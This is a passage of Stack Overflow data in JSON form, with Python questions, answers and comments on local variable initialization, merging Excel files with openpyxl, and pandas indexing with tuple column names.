"https://stackoverflow.com/users/2482744/alex-hall"}, "reply_to_user": {"reputation": 16773, "user_id": 5827215, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-s_pAOw1Sc-M/AAAAAAAAAAI/AAAAAAAAAMA/J-R1IMHbuY4/photo.jpg?sz=128", "display_name": "Tadhg McDonald-Jensen", "link": "https://stackoverflow.com/users/5827215/tadhg-mcdonald-jensen"}, "edited": false, "score": 2, "creation_date": 1462997881, "post_id": 37172495, "comment_id": 61879620, "body": "@TadhgMcDonald-Jensen I just did but there&#39;s really not that much to say. It&#39;s a very simple question."}, {"owner": {"reputation": 21991, "user_id": 75103, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/7dfc20ceb7d6e1686d9be8f68469afa7?s=128&d=identicon&r=PG", "display_name": "thebjorn", "link": "https://stackoverflow.com/users/75103/thebjorn"}, "edited": false, "score": 0, "creation_date": 1462998042, "post_id": 37172495, "comment_id": 61879723, "body": "I liked it better without the second sentence. Perhaps a &quot;It&#39;s created ..&quot; before the first sentence to give the sentence a subject..?"}, {"owner": {"reputation": 31205, "user_id": 2482744, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/OQPNY.png?s=128&g=1", "display_name": "Alex Hall", "link": "https://stackoverflow.com/users/2482744/alex-hall"}, "edited": false, "score": 3, "creation_date": 1462998183, "post_id": 37172495, "comment_id": 61879788, "body": "You guys are overthinking this."}, {"owner": {"reputation": 2325, "user_id": 2272638, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/4c4d7d86231ea02341f3a868d9d3f8c5?s=128&d=identicon&r=PG", "display_name": "dwanderson", "link": "https://stackoverflow.com/users/2272638/dwanderson"}, "edited": false, "score": 0, "creation_date": 1462998376, "post_id": 37172495, "comment_id": 61879890, "body": "It took me a second read to figure out why this answer does answer the question. @AlexHall you mention modification but you&#39;re not really modifying anything (so it&#39;s confusing). The fact that it <code>print</code>s every time you call the function shows that it&#39;s creating the <code>dict</code> anew every time, that&#39;s just not clear from your wording around it."}, {"owner": {"reputation": 31205, "user_id": 2482744, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/OQPNY.png?s=128&g=1", "display_name": "Alex Hall", "link": "https://stackoverflow.com/users/2482744/alex-hall"}, "reply_to_user": {"reputation": 2325, "user_id": 2272638, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/4c4d7d86231ea02341f3a868d9d3f8c5?s=128&d=identicon&r=PG", "display_name": "dwanderson", "link": "https://stackoverflow.com/users/2272638/dwanderson"}, "edited": false, "score": 0, "creation_date": 1462998593, "post_id": 37172495, "comment_id": 61880019, "body": "@dwanderson I&#39;m very sorry for your second."}, {"owner": {"reputation": 2325, "user_id": 2272638, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/4c4d7d86231ea02341f3a868d9d3f8c5?s=128&d=identicon&r=PG", "display_name": "dwanderson", "link": "https://stackoverflow.com/users/2272638/dwanderson"}, "edited": false, "score": 0, "creation_date": 1462998953, "post_id": 37172495, "comment_id": 61880222, "body": "No need for condescending sarcasm - people are saying your answer, while correct, isn&#39;t clear. Part of the point of these answers is to be as clear as possible."}, {"owner": {"reputation": 21991, "user_id": 75103, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/7dfc20ceb7d6e1686d9be8f68469afa7?s=128&d=identicon&r=PG", "display_name": "thebjorn", "link": "https://stackoverflow.com/users/75103/thebjorn"}, "reply_to_user": {"reputation": 2325, "user_id": 2272638, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/4c4d7d86231ea02341f3a868d9d3f8c5?s=128&d=identicon&r=PG", "display_name": "dwanderson", "link": "https://stackoverflow.com/users/2272638/dwanderson"}, "edited": false, "score": 0, "creation_date": 1462999306, "post_id": 37172495, "comment_id": 61880420, "body": "@dwanderson I think it was just good-natured sarcasm (at least that&#39;s how I read it)."}, {"owner": {"reputation": 31205, "user_id": 2482744, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/OQPNY.png?s=128&g=1", "display_name": "Alex Hall", "link": "https://stackoverflow.com/users/2482744/alex-hall"}, "reply_to_user": {"reputation": 2325, "user_id": 2272638, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/4c4d7d86231ea02341f3a868d9d3f8c5?s=128&d=identicon&r=PG", "display_name": "dwanderson", "link": "https://stackoverflow.com/users/2272638/dwanderson"}, "edited": false, "score": 0, "creation_date": 1462999378, "post_id": 37172495, "comment_id": 61880446, "body": "@dwanderson I meant no harm. I did edit the question after your comment, even before my reply."}, {"owner": {"reputation": 33, "user_id": 6322298, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/89a837d0e909daed187c0a06fb78cced?s=128&d=identicon&r=PG&f=1", "display_name": "m3diumendi4n", "link": "https://stackoverflow.com/users/6322298/m3diumendi4n"}, "edited": false, "score": 0, "creation_date": 1462999436, "post_id": 37172495, "comment_id": 61880479, "body": "Thank you for your answer. Could you share with me any tips on where I should place such &quot;const&quot; (hardcoded) dict to avoid creating it every time? Placing it as a global variable doesn&#39;t sound good to me because it&#39;s used in only one method."}, {"owner": {"reputation": 31205, "user_id": 2482744, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/OQPNY.png?s=128&g=1", "display_name": "Alex Hall", "link": "https://stackoverflow.com/users/2482744/alex-hall"}, "reply_to_user": {"reputation": 21991, "user_id": 75103, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/7dfc20ceb7d6e1686d9be8f68469afa7?s=128&d=identicon&r=PG", "display_name": "thebjorn", "link": "https://stackoverflow.com/users/75103/thebjorn"}, "edited": false, "score": 2, "creation_date": 1462999479, "post_id": 37172495, "comment_id": 61880497, "body": "@thebjorn indeed, it was just a little fun. I cannot believe how much thought everyone has put into this."}, {"owner": {"reputation": 21991, "user_id": 75103, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/7dfc20ceb7d6e1686d9be8f68469afa7?s=128&d=identicon&r=PG", "display_name": "thebjorn", "link": "https://stackoverflow.com/users/75103/thebjorn"}, "reply_to_user": {"reputation": 33, "user_id": 6322298, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/89a837d0e909daed187c0a06fb78cced?s=128&d=identicon&r=PG&f=1", "display_name": "m3diumendi4n", "link": "https://stackoverflow.com/users/6322298/m3diumendi4n"}, "edited": false, "score": 1, "creation_date": 1462999592, "post_id": 37172495, "comment_id": 61880550, "body": "@m3diumendi4n just keep it where you have it (these are not the kinds of optimizations you should worry about in Python)."}, {"owner": {"reputation": 31205, "user_id": 2482744, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/OQPNY.png?s=128&g=1", "display_name": "Alex Hall", "link": "https://stackoverflow.com/users/2482744/alex-hall"}, "reply_to_user": {"reputation": 33, "user_id": 6322298, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/89a837d0e909daed187c0a06fb78cced?s=128&d=identicon&r=PG&f=1", "display_name": "m3diumendi4n", "link": "https://stackoverflow.com/users/6322298/m3diumendi4n"}, "edited": false, "score": 0, "creation_date": 1462999821, "post_id": 37172495, "comment_id": 61880673, "body": "@m3diumendi4n Also thebjorn is right, don&#39;t over-optimise."}], "tags": [], "owner": {"reputation": 31205, "user_id": 2482744, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/OQPNY.png?s=128&g=1", "display_name": "Alex Hall", "link": "https://stackoverflow.com/users/2482744/alex-hall"}, "is_accepted": false, "score": 3, "last_activity_date": 1462999674, "last_edit_date": 1462999674, "creation_date": 1462997816, "answer_id": 37172495, "question_id": 37172464, "link": "https://stackoverflow.com/questions/37172464/python-local-variable-initialization/37172495#37172495", "title": "Python local variable initialization", "body": "<p>Every time <code>do_sth()</code> is invoked. This is important because it allows you to make modifications to <code>local_dict</code> inside the function and it won't have any effect on other calls. The interpreter is not smart enough to see if you won't change it, especially because Python is so dynamic that there are some very roundabout ways you can cause it to change.</p>\n\n<p>Here's how you can prove to yourself that the dictionary keeps getting recreated:</p>\n\n<pre><code>def print_3():\n    print(3)\n\ndef do_sth():\n    local_dict = {'a': print_3()}\n\ndo_sth()\ndo_sth()\ndo_sth()\n</code></pre>\n\n<p>This prints 3 ... 3 times.</p>\n\n<p>I think global variables are fine for optimising this, but if you really want, how about this:</p>\n\n<pre><code>def do_sth():\n    return do_sth.local_dict\n\ndo_sth.local_dict = {'a': print_3()}\n</code></pre>\n\n<p>Technically this can still be accessed by everyone but it's clearer what it belongs to.</p>\n"}, {"tags": [], "owner": {"reputation": 442, "user_id": 2432790, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/33e869cf1353248c819ef2c6e7d88fca?s=128&d=identicon&r=PG&f=1", "display_name": "LAL", "link": "https://stackoverflow.com/users/2432790/lal"}, "is_accepted": false, "score": 1, "last_activity_date": 1462998288, "creation_date": 1462998288, "answer_id": 37172633, "question_id": 37172464, "link": "https://stackoverflow.com/questions/37172464/python-local-variable-initialization/37172633#37172633", "title": "Python local variable initialization", "body": "<p>Local variable are always created in the scope of a function. There are collected by the garbage collector once the program counter quits function (scope of the local variable). </p>\n\n<pre><code>global_dict = []\n\ndef do_sth():\n    local_dict = { 'a': 1, 'b': 2, 'c': 3, ... }\n    ...\n\ndef do_other_task():\n   #local_dict not visible. It's outside of scope. \n   global global_dict # fetch memory address of previously declared global_dict\n   global_dict = { 'a': 1, 'b': 2, 'c': 3, ... }\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 21991, "user_id": 75103, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/7dfc20ceb7d6e1686d9be8f68469afa7?s=128&d=identicon&r=PG", "display_name": "thebjorn", "link": "https://stackoverflow.com/users/75103/thebjorn"}, "is_accepted": true, "score": 7, "last_activity_date": 1462998405, "creation_date": 1462998405, "answer_id": 37172663, "question_id": 37172464, "link": "https://stackoverflow.com/questions/37172464/python-local-variable-initialization/37172663#37172663", "title": "Python local variable initialization", "body": "<p>You can look at what the interpreter does using the <code>dis</code> module:</p>\n\n<pre><code>def do_sth():\n    d = {'a':2, 'b':3}\n    print(id(d))\n\n\nimport dis\ndis.dis(do_sth)\n</code></pre>\n\n<p>will print</p>\n\n<pre><code>  2           0 BUILD_MAP                2\n              3 LOAD_CONST               1 (2)\n              6 LOAD_CONST               2 ('a')\n              9 STORE_MAP           \n             10 LOAD_CONST               3 (3)\n             13 LOAD_CONST               4 ('b')\n             16 STORE_MAP           \n             17 STORE_FAST               0 (d)\n\n  3          20 LOAD_GLOBAL              0 (id)\n             23 LOAD_FAST                0 (d)\n             26 CALL_FUNCTION            1\n             29 PRINT_ITEM          \n             30 PRINT_NEWLINE       \n             31 LOAD_CONST               0 (None)\n             34 RETURN_VALUE        \n</code></pre>\n\n<p>which shows that the interpreter is rebuilding the value every time the function is called.</p>\n"}, {"comments": [{"owner": {"reputation": 21991, "user_id": 75103, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/7dfc20ceb7d6e1686d9be8f68469afa7?s=128&d=identicon&r=PG", "display_name": "thebjorn", "link": "https://stackoverflow.com/users/75103/thebjorn"}, "edited": false, "score": 0, "creation_date": 1462998826, "post_id": 37172725, "comment_id": 61880157, "body": "you&#39;re wrong ;-)   don&#39;t use dicts as default arguments (at least not without a comment).  Python is also exceedingly fast at dicts, and comparably slow at using global variables, so I&#39;m unsure if you would be saving any time..."}, {"owner": {"reputation": 7130, "user_id": 1429073, "user_type": "registered", "accept_rate": 53, "profile_image": "https://www.gravatar.com/avatar/6cf3963f7758df3b57542c790e598630?s=128&d=identicon&r=PG&f=1", "display_name": "DevLounge", "link": "https://stackoverflow.com/users/1429073/devlounge"}, "reply_to_user": {"reputation": 21991, "user_id": 75103, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/7dfc20ceb7d6e1686d9be8f68469afa7?s=128&d=identicon&r=PG", "display_name": "thebjorn", "link": "https://stackoverflow.com/users/75103/thebjorn"}, "edited": false, "score": 0, "creation_date": 1462998961, "post_id": 37172725, "comment_id": 61880228, "body": "I know that using dicts or lists as default args can be dangerous, and indeed do_smth() would have to be always called without args ;-)"}, {"owner": {"reputation": 21991, "user_id": 75103, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/7dfc20ceb7d6e1686d9be8f68469afa7?s=128&d=identicon&r=PG", "display_name": "thebjorn", "link": "https://stackoverflow.com/users/75103/thebjorn"}, "edited": false, "score": 0, "creation_date": 1462999192, "post_id": 37172725, "comment_id": 61880349, "body": "It&#39;s not so much that it is dangerous, but the semantics are generally surprising to anyone who&#39;s used default arguments anywhere else. If the comment doesn&#39;t say something like &quot;...is used to memoize..&quot; most Python programmers would be concerned."}, {"owner": {"reputation": 7130, "user_id": 1429073, "user_type": "registered", "accept_rate": 53, "profile_image": "https://www.gravatar.com/avatar/6cf3963f7758df3b57542c790e598630?s=128&d=identicon&r=PG&f=1", "display_name": "DevLounge", "link": "https://stackoverflow.com/users/1429073/devlounge"}, "reply_to_user": {"reputation": 21991, "user_id": 75103, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/7dfc20ceb7d6e1686d9be8f68469afa7?s=128&d=identicon&r=PG", "display_name": "thebjorn", "link": "https://stackoverflow.com/users/75103/thebjorn"}, "edited": false, "score": 0, "creation_date": 1462999380, "post_id": 37172725, "comment_id": 61880447, "body": "Yeah, I also would be concerned but I saw this many times in some famous third-party modules source code. Especially for memoizing a tree level during recursion, or iteration numbers, things like that."}, {"owner": {"reputation": 21991, "user_id": 75103, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/7dfc20ceb7d6e1686d9be8f68469afa7?s=128&d=identicon&r=PG", "display_name": "thebjorn", "link": "https://stackoverflow.com/users/75103/thebjorn"}, "edited": false, "score": 1, "creation_date": 1462999810, "post_id": 37172725, "comment_id": 61880665, "body": "It&#39;s the right thing to do when using it for memoization -- but use care with multiple threads, and again, with a comment, to let the next person know that you understood what you were doing."}], "tags": [], "owner": {"reputation": 7130, "user_id": 1429073, "user_type": "registered", "accept_rate": 53, "profile_image": "https://www.gravatar.com/avatar/6cf3963f7758df3b57542c790e598630?s=128&d=identicon&r=PG&f=1", "display_name": "DevLounge", "link": "https://stackoverflow.com/users/1429073/devlounge"}, "is_accepted": false, "score": 0, "last_activity_date": 1462999457, "last_edit_date": 1462999457, "creation_date": 1462998691, "answer_id": 37172725, "question_id": 37172464, "link": "https://stackoverflow.com/questions/37172464/python-local-variable-initialization/37172725#37172725", "title": "Python local variable initialization", "body": "<p>The other answers are correct, I would just add this.</p>\n\n<p>I would rather do, in such case, either:</p>\n\n<pre><code>constant_dict = { 'a': 1, 'b': 2, 'c': 3, ... }\ndef do_sth():\n    # do something reading constant_dict\n\ndo_sth()\n</code></pre>\n\n<p>or <strong>but less preferable</strong>:</p>\n\n<pre><code>def do_sth(local_dict = { 'a': 1, 'b': 2, 'c': 3, ... }):\n    # do something reading local_dict\n\ndo_sth()\n</code></pre>\n\n<p>In both cases, python would not have to reallocate the memory for the variable, because it got declared and allocated when the interpreter reads the python file.</p>\n\n<p>Correct me if I'm wrong.</p>\n"}, {"tags": [], "owner": {"reputation": 16773, "user_id": 5827215, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-s_pAOw1Sc-M/AAAAAAAAAAI/AAAAAAAAAMA/J-R1IMHbuY4/photo.jpg?sz=128", "display_name": "Tadhg McDonald-Jensen", "link": "https://stackoverflow.com/users/5827215/tadhg-mcdonald-jensen"}, "is_accepted": false, "score": 1, "last_activity_date": 1462999339, "last_edit_date": 1495542702, "creation_date": 1462999339, "answer_id": 37172897, "question_id": 37172464, "link": "https://stackoverflow.com/questions/37172464/python-local-variable-initialization/37172897#37172897", "title": "Python local variable initialization", "body": "<p>it would be easy to check with the <code>is</code> operator:</p>\n\n<pre><code>def test():\n    return {'a': 1, 'b': 2, 'c': 3}\n\n&gt;&gt;&gt; test() is test() #did both produce the same object in memory space?\nFalse\n</code></pre>\n\n<p>This makes a lot of sense for mutable objects or the <a href=\"https://stackoverflow.com/questions/1132941/least-astonishment-in-python-the-mutable-default-argument\">mutable default argument</a> trap would come up everywhere.</p>\n\n<p>However there are values that are stored as constants and those can be seen using <code>dis</code> as constants are loaded with the <a href=\"https://docs.python.org/2/library/dis.html#opcode-LOAD_CONST\" rel=\"nofollow noreferrer\"><code>LOAD_CONST</code></a> byte code:</p>\n\n<pre><code>&gt;&gt;&gt; dis.dis(lambda:1)\n  1           0 LOAD_CONST               1 (1)\n              3 RETURN_VALUE\n&gt;&gt;&gt; dis.dis(lambda:(1,True, 10*1000, \"a\"))\n  1           0 LOAD_CONST               7 ((1, True, 10000, 'a'))\n              3 RETURN_VALUE\n&gt;&gt;&gt; dis.dis(lambda:[1,2,3]) #list is mutable\n  1           0 LOAD_CONST               1 (1)\n              3 LOAD_CONST               2 (2)\n              6 LOAD_CONST               3 (3)\n              9 BUILD_LIST               3\n             12 RETURN_VALUE\n&gt;&gt;&gt; dis.dis(lambda:{\"a\":1}) #dict is also mutable\n  1           0 LOAD_CONST               1 ('a')\n              3 LOAD_CONST               2 (1)\n              6 BUILD_MAP                1\n              9 RETURN_VALUE\n</code></pre>\n"}], "owner": {"reputation": 33, "user_id": 6322298, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/89a837d0e909daed187c0a06fb78cced?s=128&d=identicon&r=PG&f=1", "display_name": "m3diumendi4n", "link": "https://stackoverflow.com/users/6322298/m3diumendi4n"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1099, "favorite_count": 0, "accepted_answer_id": 37172663, "answer_count": 5, "score": 3, "last_activity_date": 1462999674, "creation_date": 1462997701, "question_id": 37172464, "link": "https://stackoverflow.com/questions/37172464/python-local-variable-initialization", "title": "Python local variable initialization", "body": "<p>I'm rather new to python and I'm wondering how local variables work. Let's start with an example of a simple method:</p>\n\n<pre><code>def do_sth():\n    local_dict = { 'a': 1, 'b': 2, 'c': 3, ... }\n    ...\n</code></pre>\n\n<p>Let's assume that local_dict is used like a sort of const variable. And here's the question: it is created every time when do_sth() is invoked or it is created once and is kept somewhere in do_sth() internals?</p>\n"}, {"tags": ["python", "excel", "openpyxl"], "answers": [{"comments": [{"owner": {"reputation": 111, "user_id": 6322234, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/9903c3715fe425ec4ffc9d1a8b2af221?s=128&d=identicon&r=PG&f=1", "display_name": "Dennis", "link": "https://stackoverflow.com/users/6322234/dennis"}, "edited": false, "score": 0, "creation_date": 1463062423, "post_id": 37181991, "comment_id": 61911660, "body": "This did the trick nicely. I defined files as an array of filenames and changed ws1 to ws, since I had not defined ws1 elsewhere. I had to make some other small edits, but overall I understood what you were doing. The dates did come across in a different format than the original, i.e. &quot;Custom&quot; instead of &quot;Date&quot; format. Is there an easy way to fix that problem without overcomplicating it?"}, {"owner": {"reputation": 14362, "user_id": 2385133, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/3a93c5a0f975385738c1f27848f3b50a?s=128&d=identicon&r=PG", "display_name": "Charlie Clark", "link": "https://stackoverflow.com/users/2385133/charlie-clark"}, "reply_to_user": {"reputation": 111, "user_id": 6322234, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/9903c3715fe425ec4ffc9d1a8b2af221?s=128&d=identicon&r=PG&f=1", "display_name": "Dennis", "link": "https://stackoverflow.com/users/6322234/dennis"}, "edited": false, "score": 0, "creation_date": 1463066131, "post_id": 37181991, "comment_id": 61914682, "body": "I&#39;m not sure what you mean but there is no &quot;Date&quot; format. All dates and times use more or less custom formatting. But that&#39;s a separate issue."}, {"owner": {"reputation": 111, "user_id": 6322234, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/9903c3715fe425ec4ffc9d1a8b2af221?s=128&d=identicon&r=PG&f=1", "display_name": "Dennis", "link": "https://stackoverflow.com/users/6322234/dennis"}, "edited": false, "score": 0, "creation_date": 1463067926, "post_id": 37181991, "comment_id": 61915942, "body": "Yes it is a separate issue. What I mean is that it comes across as 2015-09-01 0:00:00 instead of 9/1/2015. Essentially it comes across in Long Date format instead of Short Date format. This is not a big problem though."}, {"owner": {"reputation": 14362, "user_id": 2385133, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/3a93c5a0f975385738c1f27848f3b50a?s=128&d=identicon&r=PG", "display_name": "Charlie Clark", "link": "https://stackoverflow.com/users/2385133/charlie-clark"}, "reply_to_user": {"reputation": 111, "user_id": 6322234, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/9903c3715fe425ec4ffc9d1a8b2af221?s=128&d=identicon&r=PG&f=1", "display_name": "Dennis", "link": "https://stackoverflow.com/users/6322234/dennis"}, "edited": false, "score": 0, "creation_date": 1463068296, "post_id": 37181991, "comment_id": 61916249, "body": "Excel uses number formatting to distinguish between numbers and dates and times and this is locale specific. openpyxl defaults to ISO format. to be unambiguous. You&#39;ll need to provide an explicit format if you want something else."}], "tags": [], "owner": {"reputation": 14362, "user_id": 2385133, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/3a93c5a0f975385738c1f27848f3b50a?s=128&d=identicon&r=PG", "display_name": "Charlie Clark", "link": "https://stackoverflow.com/users/2385133/charlie-clark"}, "is_accepted": true, "score": 3, "last_activity_date": 1463043465, "creation_date": 1463043465, "answer_id": 37181991, "question_id": 37172374, "link": "https://stackoverflow.com/questions/37172374/importing-multiple-excel-files-using-openpyxl/37181991#37181991", "title": "Importing Multiple Excel Files using OpenPyXL", "body": "<p>I don't really understand your code. It looks too complicated. When copying between worksheets you probably want to use <code>ws.rows</code>.</p>\n\n<pre><code>wb1 = load_workbook('master.xlsx')\nws2 = wb1.active\n\nfor f in files:\n    wb2 = load_workbook(f)\n    ws2 = wb2['Sheet1']\n    for row in ws2.rows[1:]:\n          ws1.append((cell.value for cell in row))\n</code></pre>\n"}], "owner": {"reputation": 111, "user_id": 6322234, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/9903c3715fe425ec4ffc9d1a8b2af221?s=128&d=identicon&r=PG&f=1", "display_name": "Dennis", "link": "https://stackoverflow.com/users/6322234/dennis"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 5650, "favorite_count": 1, "accepted_answer_id": 37181991, "answer_count": 1, "score": 3, "last_activity_date": 1463043465, "creation_date": 1462997407, "last_edit_date": 1462998144, "question_id": 37172374, "link": "https://stackoverflow.com/questions/37172374/importing-multiple-excel-files-using-openpyxl", "title": "Importing Multiple Excel Files using OpenPyXL", "body": "<p>I am trying to read in multiple excel files and append the data from each file into one master file. Each file will have the same headers (So I can skip the import of the first row after the initial file). </p>\n\n<p>I am pretty new to both Python and the OpenPyXL module. I am able to import the first workbook without problem. My problem comes in when I need to open the subsequent file and copy the data to paste into the original worksheet. </p>\n\n<p>Here is my code so far:</p>\n\n<pre><code># Creating blank workbook\nfrom openpyxl import Workbook\nwb = Workbook()\n\n# grab active worksheet\nws = wb.active\n\n# Read in excel data\nfrom openpyxl import load_workbook\nwb = load_workbook('first_file.xlsx') #explicitly loading workbook, will automate later\n\n# grab active worksheet in current workbook\nws = wb.active\n\n#get max columns and rows\nsheet = wb.get_sheet_by_name('Sheet1')\nprint (\"Rows: \", sheet.max_row) # for debugging purposes\nprint (\"Columns: \", sheet.max_column) # for debugging purposes\nlast_data_point = ws.cell(row = sheet.max_row, column = sheet.max_column).coordinate\nprint (\"Last data point in current worksheet:\", last_data_point) #for debugging purposes\n\n#import next file and add to master\nappend_point = ws.cell(row = sheet.max_row + 1, column = 1).coordinate\nprint (\"Start new data at:\", append_point)\nwb = load_workbook('second_file.xlsx')\nsheet2 = wb.get_sheet_by_name('Sheet1')\nstart = ws.cell(coordinate='A2').coordinate\nprint(\"New data start: \", start)\nend = ws.cell(row = sheet2.max_row, column = sheet2.max_column).coordinate\nprint (\"New data end: \", end)\n\n# write a value to selected cell\n#sheet[append_point] = 311\n#print (ws.cell(append_point).value)\n\n#save file\nwb.save('master_file.xlsx')\n</code></pre>\n\n<p>Thanks!</p>\n"}, {"tags": ["python", "pandas", "dataframe"], "comments": [{"owner": {"reputation": 439, "user_id": 5406956, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/5a59980002e90d49fd371fe68f7b08cc?s=128&d=identicon&r=PG&f=1", "display_name": "ConanG", "link": "https://stackoverflow.com/users/5406956/conang"}, "edited": false, "score": 0, "creation_date": 1508574077, "post_id": 37172354, "comment_id": 80670180, "body": "Yes, the second argument to loc needs to be a list containing the tuple. Also, the first argument doesn&#39;t work with .loc[:n, [...]] but works with .loc[:, [...]]. Odd."}], "answers": [{"comments": [{"owner": {"reputation": 521, "user_id": 6301373, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-eyq0XbdMSNU/AAAAAAAAAAI/AAAAAAAAAmI/3WdDENbp8uc/photo.jpg?sz=128", "display_name": "Charlie Brummitt", "link": "https://stackoverflow.com/users/6301373/charlie-brummitt"}, "edited": false, "score": 1, "creation_date": 1486218669, "post_id": 37172399, "comment_id": 71256334, "body": "How does one mix these two?  <code>df1.loc[:3, [&#39;nontuple&#39;, (&#39;c&#39;, &#39;3&#39;)]]</code> returns <code>ValueError: setting an array element with a sequence</code>"}, {"owner": {"reputation": 171449, "user_id": 5741205, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/SG6BE.png?s=128&g=1", "display_name": "MaxU", "link": "https://stackoverflow.com/users/5741205/maxu"}, "reply_to_user": {"reputation": 521, "user_id": 6301373, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-eyq0XbdMSNU/AAAAAAAAAAI/AAAAAAAAAmI/3WdDENbp8uc/photo.jpg?sz=128", "display_name": "Charlie Brummitt", "link": "https://stackoverflow.com/users/6301373/charlie-brummitt"}, "edited": false, "score": 2, "creation_date": 1486290836, "post_id": 37172399, "comment_id": 71274320, "body": "@CharlieBrummitt, that&#39;s interesting! <code>df1.loc[:3, [(&#39;c&#39;, &#39;3&#39;), &#39;nontuple&#39;]]</code> works, but <code>df1.loc[:3, [&#39;nontuple&#39;, (&#39;c&#39;, &#39;3&#39;)]]</code> doesn&#39;t. Unfortunately I don&#39;t have a solution for that. In general i&#39;d try to avoid using tuples as column names..."}], "tags": [], "owner": {"reputation": 171449, "user_id": 5741205, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/SG6BE.png?s=128&g=1", "display_name": "MaxU", "link": "https://stackoverflow.com/users/5741205/maxu"}, "is_accepted": true, "score": 10, "last_activity_date": 1462999047, "last_edit_date": 1462999047, "creation_date": 1462997492, "answer_id": 37172399, "question_id": 37172354, "link": "https://stackoverflow.com/questions/37172354/pandas-loc-with-tuple-column-names/37172399#37172399", "title": "Pandas .loc with Tuple column names", "body": "<p><a href=\"http://pandas.pydata.org/pandas-docs/stable/indexing.html\" rel=\"noreferrer\">Documenation</a></p>\n\n<p>access by tuple, returns DF:</p>\n\n<pre><code>In [508]: df1.loc[:3, [('c', '3')]]\nOut[508]:\n     (c, 3)\n0  1.433004\n1 -0.731705\n2 -1.633657\n3  0.565320\n</code></pre>\n\n<p>access by non-tuple column, returns series:</p>\n\n<pre><code>In [514]: df1.loc[:3, 'nontuple']\nOut[514]:\n0    0.783621\n1    1.984459\n2   -2.211271\n3   -0.532457\nName: nontuple, dtype: float64\n</code></pre>\n\n<p>access by non-tuple column, returns DF:</p>\n\n<pre><code>In [517]: df1.loc[:3, ['nontuple']]\nOut[517]:\n   nontuple\n0  0.783621\n1  1.984459\n2 -2.211271\n3 -0.532457\n</code></pre>\n\n<p>access any column by it's number, returns series:</p>\n\n<pre><code>In [515]: df1.iloc[:3, 2]\nOut[515]:\n0    1.433004\n1   -0.731705\n2   -1.633657\nName: (c, 3), dtype: float64\n</code></pre>\n\n<p>access any column(s) by it's number, returns DF:</p>\n\n<pre><code>In [516]: df1.iloc[:3, [2]]\nOut[516]:\n     (c, 3)\n0  1.433004\n1 -0.731705\n2 -1.633657\n</code></pre>\n\n<p><strong>NOTE:</strong> pay attention at the differences between <code>.loc[]</code> and <code>.iloc[]</code> - they are filtering rows differently!</p>\n\n<p>this works like Python's slicing:</p>\n\n<pre><code>In [531]: df1.iloc[0:2]\nOut[531]:\n     (a, 1)    (b, 2)    (c, 3)  nontuple\n0  0.650961 -1.130000  1.433004  0.783621\n1  0.073805  1.907998 -0.731705  1.984459\n</code></pre>\n\n<p>this includes right index boundary:  </p>\n\n<pre><code>In [532]: df1.loc[0:2]\nOut[532]:\n     (a, 1)    (b, 2)    (c, 3)  nontuple\n0  0.650961 -1.130000  1.433004  0.783621\n1  0.073805  1.907998 -0.731705  1.984459\n2 -1.511939  0.167122 -1.633657 -2.211271\n</code></pre>\n"}], "owner": {"reputation": 73, "user_id": 6322328, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d6ebd57a9ae5630e7f959e12c7bf5b56?s=128&d=identicon&r=PG&f=1", "display_name": "ezl33", "link": "https://stackoverflow.com/users/6322328/ezl33"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 5450, "favorite_count": 2, "accepted_answer_id": 37172399, "answer_count": 1, "score": 